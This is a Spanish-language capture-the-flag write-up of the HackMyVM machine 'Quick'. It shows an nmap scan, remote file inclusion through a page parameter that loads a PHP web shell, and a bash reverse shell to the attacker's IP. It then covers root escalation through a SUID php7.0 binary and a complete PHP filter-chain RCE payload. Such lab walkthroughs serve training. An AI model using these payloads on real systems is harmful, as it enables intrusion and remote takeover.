---
layout: default
title: Quick
parent: HackMyVM
grand_parent: Writeups
---

# Quick
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

## Enumeracion

Iniciamos con un escaneo de nmap donde encontraremos el puerto 80(HTTP)

```ruby
nmap -sS -n -Pn --open -p- 192.168.1.88
```
- sS: haga un TCP SYN Scan el cual hace un escaneo sigiloso sin completar las conexiones TCP, responde con un SYN/ACK si el puerto esta abierto

 - n: para que no haga resolucion DNS y tarde menos el escaneo

 - Pn: para evitar el descubrimiento de hosts

 - open: para que solo muestre los puertos abiertos

 - -p-: para que escanee todo el rango de puertos

```ruby
PORT   STATE SERVICE
80/tcp open  http
```

## Explorando el sitio web 

No pondre la parte donde hice directory fuzzing por que lo unico interesante que encontraremos es un archivo llamado **connect.php** pero no sera de utilidad.

Si exploramos el sito web podemos ver que tenemos un navbar con varias opciones, donde al seleccionar una, se incluye la pagina seleccionada, como se ve en la imagen

![](/assets/img/quick/1.png)

Igual si vemos el codigo fuente podemos ver lo mismo:

```html
<nav>
        <ul>
            <li><a href="index.php?page=home">Home</a></li>
            <li><a href="index.php?page=cars">Cars</a></li>
            <li><a href="index.php?page=maintenance_and_repair">Maintenance & Repair</a></li>
            <li><a href="index.php?page=about">About</a></li>
            <li><a href="index.php?page=contact">Contact</a></li>
        </ul>
    </nav>
```

Cuando tenemos casos asi de que se incluyen paginas y que ademas se pueda ver en la URL, como nuestro caso (index.php?page=cars), es un indicio para probar LFI (Local File Inclusion) o RFI (Remote File Inclusion)

## Explotacion (RFI - Remote File Inclusion)

**RFI**: Remote File Inclusion es una vulnerabilidad que permite incluir archivos externos y/o remotos al servidor web

Como mencione, la idea es lograr incluir archivos externos, por lo que, para probar, podemos crearnos un servidor web con python  y ver si recibimos una peticion de la maquina victima

```bash
python3 -m http.server 8080
```
Ahora en la URL del sitio web pondremos:

```ruby
http://192.168.1.88/index.php?page=http://192.168.1.73:8080/
```

Y nos llega una peticion:

![](/assets/img/quick/2.png)

Oberva que en la peticion que hizo, esta esperando por archivos con extension .php: **GET /.php HTTP/1.0**

Ahora para poder "subir" una web shell debemos de hacer lo mismo, pero indicarle un archivo php que queremos, en mi caso creare este:

```php
<?php system($_GET[cmd]); ?>
```
Y observa como se realizo la peticion correctamente

![](/assets/img/quick/3.png)

Pareciera que el archivo se incluyo, y que accediendo a: **http://192.168.1.88/shell.php** lo podremos ejecutar, pero en realidad no, debemos de hacerlo desde la misma URL de la siguiente forma

```ruby
http://192.168.1.88/index.php?page=http://192.168.1.73:8080/shell&cmd=id
```
Y hemos conseguido RCE

![](/assets/img/quick/4.png)

Ahora nos enviaremos una reverse shell con bash

```ruby
http://192.168.1.88/index.php?page=http://192.168.1.73:8080/shell&cmd=bash -c "bash -i >%26 /dev/tcp/<tu_ip>/443 0>%261"
```

![](/assets/img/quick/5.png)

En este punto podemos leer la flag de user del directorio del usuario **andrew** ya que tiene permisos de lectura para otros

![](/assets/img/quick/6.png)

## Escalada de privilegios

Si buscamos por binarios SUID encontraremos el PHP 7.0:

```bash
find / -perm -u=s -type f 2>/dev/null

/usr/bin/php7.0
```

Haciendo una pequeña busqueda en GFTOBins  encontraremos una forma de hacernos root ingresando esto:

```bash
sudo install -m =xs $(which php) .

CMD="/bin/sh"
./php -r "pcntl_exec('/bin/sh', ['-p']);"
```
Pero no es necesario, lo unico que debemos de ejecutar es 

```bash
/usr/bin/php7.0 -r "pcntl_exec('/bin/bash', ['-p']);"
```

Ya seremos root y podemos leer la flag

![](/assets/img/quick/7.png)

## Intrusion (via no intencionada)

Otra manera de poder conseguir RCE que posiblemente no sea intencionadas es haciendo uso de **filter chain**,  para realizarlo podemos hacer uso de este script que automatiza la creacion del payload usando php filters chains: [https://github.com/synacktiv/php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator)

Para el ejemplo generare el payload que haga uso de la funcion system para ejecutar el comando **id**

```ruby
python3 php_filter_chain_generator.py --chain '<?php system("id"); ?>'
```

Nos genera todo esto

```
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp  
```
Cuando nosotros enviemos el payload la pagina interpretara el PHP y ejecutara el comando indicando en **system**

![](/assets/img/quick/8.png)

Ahora podemos hacer lo mismo que en la intrucion intencionada, crear un payload que haga uso de **system** para ejecutar lo que recibe por el parametro **cmd** a traves de GET:

```ruby
python3 php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]); ?>'
```

Al payload generado solamente al final le agregamos el **&cmd=** cuando lo ingresemos en la web

![](/assets/img/quick/9.png)

Eso ha sido todo, gracias por leer ❤